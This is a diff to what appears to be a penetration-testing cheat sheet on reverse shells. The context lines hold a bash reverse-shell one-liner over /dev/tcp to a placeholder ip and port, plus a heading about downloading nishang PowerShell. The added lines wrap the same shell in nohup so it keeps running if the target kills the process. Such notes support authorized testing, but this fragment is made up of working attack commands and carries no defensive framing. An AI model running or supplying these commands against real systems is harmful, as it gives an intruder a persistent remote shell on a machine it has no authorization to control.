@@ -64,6 +64,10 @@ Convert shell to base64 when sending it through http:
 
 	Try something but with 'bash -c "bash -i >& /dev/tcp/ip/port 0>&1"'
 
+If the process of our shell is being killed by the target host, we can try creating in a new process:
+
+	'nohup bash -c " bash -i >& /dev/tcp/ip/port 0>&1" &'
+
 ## Windows Reverse shells
 
 Download nishang powershell:
